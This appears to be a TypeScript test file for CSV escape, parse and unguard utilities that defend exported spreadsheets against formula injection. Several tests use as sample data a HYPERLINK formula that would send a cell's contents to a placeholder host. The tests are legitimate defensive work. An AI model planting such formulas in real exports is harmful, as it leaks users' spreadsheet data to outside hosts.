import {
  CSV_FORMULA_TRIGGERS,
  escapeCsvCell,
  parseCsvRows,
  toCsvRow,
  toCsvText,
  unguardCsvCell
} from './csv.utils';

describe('csv.utils', () => {
  describe('escapeCsvCell', () => {
    it('quotes a value containing a comma', () => {
      expect(escapeCsvCell('Food, Drinks')).toBe('"Food, Drinks"');
    });

    it('doubles an embedded quote and wraps the cell', () => {
      expect(escapeCsvCell('a "quoted" word')).toBe('"a ""quoted"" word"');
    });

    it('quotes a value containing a newline', () => {
      expect(escapeCsvCell('line one\nline two')).toBe('"line one\nline two"');
    });

    it('quotes a value containing a carriage return', () => {
      expect(escapeCsvCell('line one\rline two')).toBe('"line one\rline two"');
    });

    it('leaves an ordinary value untouched', () => {
      expect(escapeCsvCell('Coffee')).toBe('Coffee');
      expect(escapeCsvCell('')).toBe('');
    });

    it('guards every character a spreadsheet would read as a formula', () => {
      for (const trigger of CSV_FORMULA_TRIGGERS) {
        const escaped = escapeCsvCell(`${trigger}SUM(A1)`);
        // A leading tab or CR also forces quoting, so compare the unwrapped cell.
        const cell = escaped.startsWith('"') ? escaped.slice(1, -1) : escaped;
        expect(cell).toBe(`'${trigger}SUM(A1)`);
      }
    });

    it('guards a value that already begins with the guard character', () => {
      expect(escapeCsvCell("'til payday")).toBe("''til payday");
    });

    it('leaves a negative amount unguarded so a spreadsheet still sums it', () => {
      expect(escapeCsvCell('-45.00')).toBe('-45.00');
      expect(escapeCsvCell('+1200')).toBe('+1200');
      expect(escapeCsvCell('1.5e3')).toBe('1.5e3');
    });

    it('guards an expression that only looks like a number', () => {
      expect(escapeCsvCell('-1+1')).toBe("'-1+1");
    });

    it('guards before quoting so the guard survives inside the quotes', () => {
      expect(escapeCsvCell('=1,2')).toBe('"\'=1,2"');
    });
  });

  describe('toCsvRow and toCsvText', () => {
    it('escapes every cell in the row, not a chosen few', () => {
      expect(toCsvRow(['Food, Drinks', 'a; b', '=1'])).toBe('"Food, Drinks",a; b,\'=1');
    });

    it('writes the header first and no trailing newline', () => {
      expect(toCsvText(['A', 'B'], [['1', '2'], ['3', '4']])).toBe('A,B\n1,2\n3,4');
    });
  });

  describe('parseCsvRows', () => {
    it('reads a field holding a comma', () => {
      expect(parseCsvRows('a,"b,c",d')).toEqual([['a', 'b,c', 'd']]);
    });

    it('reads a field holding an escaped quote', () => {
      expect(parseCsvRows('a,"say ""hi""",b')).toEqual([['a', 'say "hi"', 'b']]);
    });

    it('keeps a quoted newline inside one field', () => {
      expect(parseCsvRows('a,"line one\nline two",b')).toEqual([['a', 'line one\nline two', 'b']]);
    });

    it('reads rows terminated with CRLF', () => {
      expect(parseCsvRows('a,b\r\nc,d')).toEqual([['a', 'b'], ['c', 'd']]);
    });

    it('reads rows terminated with a lone carriage return', () => {
      expect(parseCsvRows('a,b\rc,d')).toEqual([['a', 'b'], ['c', 'd']]);
    });

    it('emits no row for a trailing newline', () => {
      expect(parseCsvRows('a,b\n')).toEqual([['a', 'b']]);
      expect(parseCsvRows('a,b\r\n')).toEqual([['a', 'b']]);
    });

    it('drops a blank line between rows', () => {
      expect(parseCsvRows('a,b\n\n   \nc,d')).toEqual([['a', 'b'], ['c', 'd']]);
    });

    it('trims an unquoted field and leaves a quoted one exact', () => {
      expect(parseCsvRows('Date, Description ,"  spaced  "')).toEqual([
        ['Date', 'Description', '  spaced  ']
      ]);
    });

    it('keeps a quoted field that is only whitespace', () => {
      expect(parseCsvRows('"  "')).toEqual([['  ']]);
      expect(parseCsvRows('""')).toEqual([['']]);
    });

    it('flushes the last field when a quote is never closed', () => {
      expect(parseCsvRows('a,"truncated')).toEqual([['a', 'truncated']]);
    });

    it('keeps an empty cell in the middle of a row', () => {
      expect(parseCsvRows('a,,c')).toEqual([['a', '', 'c']]);
    });
  });

  describe('unguardCsvCell', () => {
    it('strips a guard the exporter wrote', () => {
      expect(unguardCsvCell("'=HYPERLINK(\"http://x\")")).toBe('=HYPERLINK("http://x")');
      expect(unguardCsvCell("'-1+1")).toBe('-1+1');
    });

    it('leaves a leading apostrophe that guards nothing', () => {
      expect(unguardCsvCell("'til payday")).toBe("'til payday");
    });

    it('restores a value that legitimately begins with an apostrophe', () => {
      expect(unguardCsvCell("''til payday")).toBe("'til payday");
    });

    it('leaves an ordinary value alone', () => {
      expect(unguardCsvCell('Coffee')).toBe('Coffee');
      expect(unguardCsvCell('')).toBe('');
    });
  });

  describe('round trip', () => {
    it('round-trips a cell holding a comma, a quote, a newline and a leading equals', () => {
      const original = '=HYPERLINK("http://x/?d="&A1,"receipt")\nsecond line';

      const parsed = parseCsvRows(toCsvText(['Note'], [[original]]));

      expect(parsed.length).toBe(2);
      expect(unguardCsvCell(parsed[1][0])).toBe(original);
    });

    it('round-trips a value that begins with an apostrophe', () => {
      const original = "'til payday";

      const parsed = parseCsvRows(toCsvText(['Note'], [[original]]));

      expect(unguardCsvCell(parsed[1][0])).toBe(original);
    });

    it('round-trips every cell of a row whose values all need different handling', () => {
      const original = ['Food, Drinks', 'say "hi"', '-45.00', '@sum', 'plain'];

      const parsed = parseCsvRows(toCsvRow(original));

      expect(parsed[0].map(unguardCsvCell)).toEqual(original);
    });
  });
});
